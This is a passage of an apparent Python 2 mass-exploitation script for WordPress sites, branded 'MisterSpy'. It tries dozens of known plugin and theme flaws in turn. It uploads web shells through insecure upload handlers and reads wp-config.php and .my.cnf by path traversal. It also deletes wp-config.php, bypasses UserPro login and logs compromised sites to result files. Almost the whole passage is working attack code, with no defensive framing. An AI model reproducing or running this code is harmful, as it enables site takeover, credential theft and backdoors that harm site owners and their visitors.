		res = re.findall(r'<i class=\"(.*?)\"',str(data.content))
		for i in res:
			if i == str('icon-checkmark6') and data.status_code == 200:
				print("\033[92m[>] \033[0mExploit Reset Password   \033[92m[Done] ").format(url,login,pw,sb,fg)
				open('Exploited/resetsuccess.txt', 'a').write(url + "|" + login + "|" + pw + "\n")
			else:
				print('\033[92m[>] \033[0mExploit Reset Password  \033[91m[Failed] ').format(url,sb,fr)

		# arforms_del

		payload = {
		  "action":"arf_delete_file",
		  "file_name":"../../../../wp-config.php"
		  }

		r = requests.post(url + "/wp-admin/admin-ajax.php", data=payload, headers=headers)

		sh = requests.get(url + "/wp-admin")
		
		if 'id="setup" method="post" action="?step=0' in sh.content:
			print("\033[92m[>] \033[0mExploit Arformsdel   \033[92m[Done] ").format(url,sb,fg)
			open('Exploited/arformsdelete.txt', 'a').write(url + "\n")
		else:
			print("\033[92m[>] \033[0mExploit Arformsdel  \033[91m[Failed] ").format(url,sb,fr)

		# wp_install
		
		list_path = ['/','/new', '/wp', '/wordpress']
		
		for path in list_path:
			check = requests.get(url + path + "/wp-admin/setup-config.php" ,headers=headers)
			if '<a href="setup-config.php?step=1' in check.content:
				print("\033[92m[>] \033[0mExploit Wp Install   \033[92m[Done] ").format(url,sb,fg)
				open('Exploited/WP-install.txt', 'a').write(url + path + "/wp-admin/setup-config.php" + "\n")
			else:
				print("\033[92m[>] \033[0mExploit Wp Install   \033[91m[Failed] ").format(url,sb,fr)



		
		# install 1
		
		inlib = requests.get(url+"/wp-admin/setup-config.php")
				
		if 'Setup Configuration File' in inlib.content:
			print '\033[92m[>] \033[0mExploit Wp Install 1   \033[92m[Done] '.format(sn)
			open('Exploited/WP-install.txt', 'a').write(url+'/wp-admin/setup-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Wp Install 1  \033[91m[Failed] '.format(sn)

		# install 2
		
		inlib = requests.get(url+"/wordpress/wp-admin/setup-config.php")
				
		if 'Setup Configuration File' in inlib.content:
			print '\033[92m[>] \033[0mExploit Wp Install 2   \033[92m[Done] '.format(sn)
			open('Exploited/WP-install.txt', 'a').write(url+'/wordpress/wp-admin/setup-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Wp Install 2  \033[91m[Failed] '.format(sn)
			
		#  . ajax
		
		formup = {'file':(filenames, shell, 'text/html')}
		
		formreq = requests.post(url+'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=afp', files=formup)
		
		formlib = requests.get(url+'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/uploads/'+filenames)
		
		
		if 'MisterSpyv7' in formlib.content:
			print '\033[92m[>] \033[0mExploit wp-ajax-form-pro  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/uploads/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit wp-ajax-form-pro  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)		


		# clockstone
		
		formup = {'file':(filenames, shell, 'text/html')}
		
		formreq = requests.post(url+'/wp-content/themes/clockstone/theme/functions/uploadbg.php', files=formup)
		
		formlib = requests.get(url+'/wp-content/themes/clockstone/theme/functions/'+filenames)
		
		
		if 'MisterSpyv7' in formlib.content:
			print '\033[92m[>] \033[0mExploit clockstone   \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/clockstone/theme/functions/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit clockstone   \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#  . st_newsletter
		
		formup = {'file':(filenames, shell, 'text/html')}
		
		formreq = requests.post(url+'/wp-content/plugins/st_newsletter/visual_editors/fckeditor/editor/filemanager/upload/test.html', files=formup)
		
		formlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyv7' in formlib.content:
			print '\033[92m[>] \033[0mExploit st_newsletter  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit st_newsletter  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	

		#  . Wpshop
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload', files=manaup)
		
		manalib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit wpshop1 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit wpshop1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)



		#  . phpcalendar
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit phpcalendar  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit phpcalendar  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . mobilefriendlyappbuilder
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/server/images.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit mobile-friendly-app-builder  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit mobile-friendly-app-builder  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . InBoundio Marketing
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit InBoundio Marketing  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit InBoundio Marketing  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . wysija
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes', files=manaup)
		
		manalib = requests.get(url+'/wp-content/uploads/wysija/themes/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit wysija  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit wysija  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . mobile
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/wp-mobile-detector/resize.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit mobile  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-mobile-detector/cache/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit mobile  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . zoomsounds
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/dzs-zoomsounds/admin/upload.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/dzs-zoomsounds/admin/upload/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit zoomsounds  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/dzs-zoomsounds/admin/upload/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit zoomsounds  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		#  . gallery
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit contact  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit contact  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		#  . work
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit work  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit work  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . calendar
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/', files=manaup)
		
		manalib = requests.get(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit calendar  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/php-event-calendar/server/file-uploader/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit calendar  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#  . markets
		
		manaup = {'file':(filenames, shell, 'text/html')}
		
		manareq = requests.post(url+'/wp-content/themes/synoptic/lib/avatarupload/upload.php', files=manaup)
		
		manalib = requests.get(url+'/wp-content/uploads/markets/avatars/'+filenames)
		
		
		if 'MisterSpyv7' in manalib.content:
			print '\033[92m[>] \033[0mExploit markets  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/markets/avatars/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit markets  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		# jssor
		
		jssorup = {'file':(indecx, 'text/html')}
		
		jssorreq = requests.post(url+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library', files=jssorup)
		
		jssorlib = requests.get(url+'/wp-content/jssor-slider/jssor-uploads/'+indecx)
		
		
		if 'Mister Spy' in jssorlib.content:
			print '\033[92m[>] \033[0mExploit Jssor Slider  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Index.txt', 'a').write(url+'/wp-content/jssor-slider/jssor-uploads/'+indecx+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Jssor Slider  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyv7' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit revslider 2018  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit revslider 2018  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
		# 3 .   Showbiz
		
		
		showbizapp = {'action':'showbiz_ajax_action',
					    'client_action':'update_plugin'}
						
						
		showbizup = {'update_file':(filenames, shell, 'text/html')}
		
		showbizreq = requests.post(url+'/wp-admin/admin-ajax.php', data=showbizapp , files=showbizup)
		
		showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames)
		
		if 'MisterSpyv7' in showbizlib.content:
			print '\033[92m[>] \033[0mExploit showbiz 2018  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit showbiz 2018  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 4 . Reflex Gallery
		
		Reflexup = {'qqfile' : (filenames, shell, 'text/html')}
		
		Reflexreq = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01', files=Reflexup)
		
		Reflexlib = requests.get(url+'/wp-content/uploads/2018/01/'+filenames)
		
		
		if 'MisterSpyv7' in Reflexlib.content:
			print '\033[92m[>] \033[0mExploit Reflex 2018  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Reflex 2018  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
		# 4 . category-page-icons
		
		categoryup = {'qqfile' : (filenames, shell, 'text/html')}
		
		categoryreq = requests.post(url+'/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php', files=categoryup)
		
		categorylib = requests.get(url+'/wp-content/'+filenames)
		
		
		if 'MisterSpyv7' in categorylib.content:
			print '\033[92m[>] \033[0mExploit category-page-icons  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit category-page-icons  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		# 5 .  Wysija
		
		Wysijaup = {'my-theme':open('Files/Master.zip', 'rb')}
		
		
		Wysijaapp = {'action':'themeupload',
				   'submitter':'Upload',
				   'overwriteexistingtheme':'on',
				   'page':'GZNeFLoZAb'}
				   
				   
		Wysijareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' , data=Wysijaapp, files=Wysijaapp)
		
		Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Wysijalib.content:
			print '\033[92m[>] \033[0mExploit wysija  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/up.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit wysija  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		
		
		# 6 . LearnDash
		
		
		
		LearnDashup={'uploadfiles[]': (filenamex, shell, 'text/html')}
		
		
		zbiaz = requests.post(url+'/wp-content/uploads/assignments/ms-sitemple.php', files=LearnDashup)
		
		
		LearnDashlib = requests.get(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.'))
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019 ' in LearnDashlib.content:
			print '\033[92m[>] \033[0mExploit assignments  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.')+'\n')
		else:
			print '\033[92m[>] \033[0mExploit assignments  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		# 7 . Tevolution
		
		
		Tevoup = {'file':(filenames, shell, 'text/html')}
		
		Tevoreq = requests.post(url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)
		
		Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
		
		if 'MisterSpyv7' in Tevorlib.content:
			print '\033[92m[>] \033[0mExploit Directory  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Directory  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 8 . Cherry
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'MisterSpyv7' in Cherrylib.content:
			print '\033[92m[>] \033[0mExploit Cherry  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Cherry  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		# 8 . downloads
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/downloads-manager/readme.txt', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/downloads-manager/upload/'+filenames)
		
		
		if 'MisterSpyv7' in Cherrylib.content:
			print '\033[92m[>] \033[0mExploit downloads  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/downloads-manager/upload/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit downloads  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		# 8 . developer-tools
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/developer-tools/libs/swfupload/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/developer-tools/libs/'+filenames)
		
		
		if 'MisterSpyv7' in Cherrylib.content:
			print '\033[92m[>] \033[0mExploit developer-tools  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/developer-tools/libs/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit developer-tools  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		# 8 . favicon
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php"', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/uploads/favicon/'+filenames)
		
		
		if 'MisterSpyv7' in Cherrylib.content:
			print '\033[92m[>] \033[0mExploit favicon \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/favicon/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit favicon  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#1 UserPro		
			
		azirevlib = requests.get(url+"/?up_auto_log=true")
				
		if 'wp-admin-bar-customize' in azirevlib.content:
			print '\033[92m[>] \033[0mExploit UserPro Bypass  \033[92m[Done] '.format(sn)
			open('Exploited/Userpro.txt', 'a').write(url+'/?up_auto_log=true'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit UserPro Bypass  \033[91m[Failed] '.format(sn)
			
			
		
		#2 qualifire
		
		
		appgravkg  = {'folder':'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php'}
		
		
		Gravkg = {'Filedata':(filename, shell, 'text/html')}
		
		Gravkgreq = requests.post(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', data=appgravkg, files=Gravkg)
	
		
		Gravkglib = requests.get(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravkglib.content:
			print '\033[92m[>] \033[0mExploit Qualifire  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Qualifire  \033[91m[Failed] '.format(sn)


			
		#3 Coldfusion
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/Coldfusion/includes/uploadify/upload_settings_image.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Coldfusion  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Coldfusion  \033[91m[Failed] '.format(sn)	

	
		#4 magic-fields
		
		aReflexup = {'qqfile' : (filenames, shell, 'text/html')}
		
		aReflexreq = requests.post(url+'/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php', files=aReflexup)
		
		aReflexlib = requests.get(url+'/wp-content/files_mf/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aReflexlib.content:
			print '\033[92m[>] \033[0mExploit Magic-Fields  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Magic-Fields   \033[91m[Failed] '.format(sn)	
		
			
		#5 Ghost
		
		bReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		bReflexreq = requests.post(url+'/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Ghost  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Ghost   \033[91m[Failed] '.format(sn)	
		
				
	
		
		#6 Gravity
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../',
		'name':'Mah.phtml'}
		
		Grav = {'file':(filename, shell, 'text/html')}
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		Gravlib = requests.get(url+'/wp-content/uploads/_input_3_Mah.phtml')
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
			print '\033[92m[>] \033[0mExploit Gravity  \033[92m[Done] '.format(sn)
			open('Exploited/Index.txt', 'a').write(url+'/wp-content/uploads/_input_3_Mah.phtml'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Gravity   \033[91m[Failed] '.format(sn)


		#7 Gravitys Forms PHP
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'Mah.php5'}
		
		Grav = {'file':(filename, shell, 'text/html')}
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		Gravlib = requests.get(url+'/wp-content/_input_3_Mah.php5')
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
			print '\033[92m[>] \033[0mExploit Gravity PHP  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/_input_3_Mah.php5'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Gravity PHP  \033[91m[Failed] '.format(sn)


		#8 Cpanel
		cplib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf")
				
		if 'user' in cplib.content:
			print '\033[92m[>] \033[0mExploit Cpanel   \033[92m[Done] '.format(sn)
			open('Exploited/Cpanels.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Cpanel  \033[91m[Failed] '.format(sn)		


		
		#9 Revslider Configurations
		
		revlib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '\033[92m[>] \033[0mExploit Revslider Config   \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Revslider Config  \033[91m[Failed] '.format(sn)


		
		#10 social-networking-e-commerce-1
		
		
		appgravk  = {'config_path':'../../../../../../'}
		
		
		Gravk = {'image':(filename, shell, 'text/html')}
		
		Gravkreq = requests.post(url+'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php', data=appgravk, files=Gravk)
		
		Gravklib = requests.get(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravklib.content:
			print '\033[92m[>] \033[0mExploit Networking-E-Commerce   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Networking-E-Commerce  \033[91m[Failed] '.format(sn)
			
		
		#11 revslider

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit Revslider  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Revslider  \033[91m[Failed] '.format(sn)
		

        #Avada +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit Avada  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Avada  \033[91m[Failed] '.format(sn)
        		

        #striking_r +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit Striking_r  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Striking_r  \033[91m[Failed] '.format(sn)
			
        #IncredibleWP +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
